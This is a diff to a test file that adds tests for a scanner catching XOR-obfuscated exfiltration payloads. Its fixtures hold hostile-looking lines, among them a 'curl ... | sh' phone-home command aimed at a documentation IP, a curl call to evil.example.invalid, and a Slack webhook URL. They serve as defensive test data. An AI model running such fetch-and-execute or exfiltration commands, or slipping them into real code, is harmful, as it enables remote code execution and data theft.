@@ -61,6 +61,54 @@ def test_base85_random_run_not_flagged():
     assert not findings
 
 
+# -- item: single-byte XOR-obfuscated payloads -------------------------------
+
+def _xor(data: bytes, key: int) -> bytes:
+    return bytes(b ^ key for b in data)
+
+
+def test_xor_webhook_detected():
+    payload = b"https://hooks.slack.com/services/T00000000/B00000000/" + b"X" * 24
+    data = b"WGHT" + b"\x00" * 8 + _xor(payload, 0x5A) + b"\x00" * 8
+    assert "EXFIL_XOR_PAYLOAD" in rules(ExfilScanner().scan_bytes(data))
+
+
+def test_xor_command_detected():
+    payload = b"os.system('curl http://198.51.100.9/beacon | sh')  # phone home"
+    data = b"\x00" * 8 + _xor(payload, 0x3C) + b"\x00" * 8
+    findings = [f for f in ExfilScanner().scan_bytes(data) if f.rule_id == "EXFIL_XOR_PAYLOAD"]
+    assert findings and findings[0].severity in (exfil_mod.Severity.HIGH,
+                                                 exfil_mod.Severity.CRITICAL)
+
+
+def test_xor_narrow_charset_secret_not_flagged():
+    # A narrow-charset credential alone (no structural indicator) is intentionally
+    # NOT flagged by the XOR path — that pattern aliases with quantized weights.
+    payload = b"AKIAIOSFODNN7EXAMPLE" + b"Z" * 20
+    data = b"\x00" * 8 + _xor(payload, 0x3C) + b"\x00" * 8
+    assert "EXFIL_XOR_PAYLOAD" not in rules(ExfilScanner().scan_bytes(data))
+
+
+def test_xor_key_zero_not_double_reported():
+    # key 0 == plaintext; the normal string scan handles it, the XOR path skips.
+    payload = b"os.system('curl http://evil.example.invalid/x')"
+    data = b"\x00" * 8 + payload + b"\x00" * 8
+    assert "EXFIL_XOR_PAYLOAD" not in rules(ExfilScanner().scan_bytes(data))
+
+
+def test_xor_random_bytes_not_flagged():
+    # Deterministic pseudo-binary (no XOR key yields an indicator) -> no finding.
+    blob = bytes((i * 37 + 11) & 0xFF for i in range(4096))
+    assert "EXFIL_XOR_PAYLOAD" not in rules(ExfilScanner().scan_bytes(blob))
+
+
+def test_xor_can_be_disabled(monkeypatch):
+    monkeypatch.setenv("PURSER_EXFIL_XOR", "0")
+    payload = b"https://hooks.slack.com/services/T0/B0/" + b"X" * 24
+    data = b"\x00" * 8 + _xor(payload, 0x5A) + b"\x00" * 8
+    assert "EXFIL_XOR_PAYLOAD" not in rules(ExfilScanner().scan_bytes(data))
+
+
 # -- item 8: configurable / strict host allowlist ----------------------------
 
 def test_allowlisted_host_ignored_by_default():
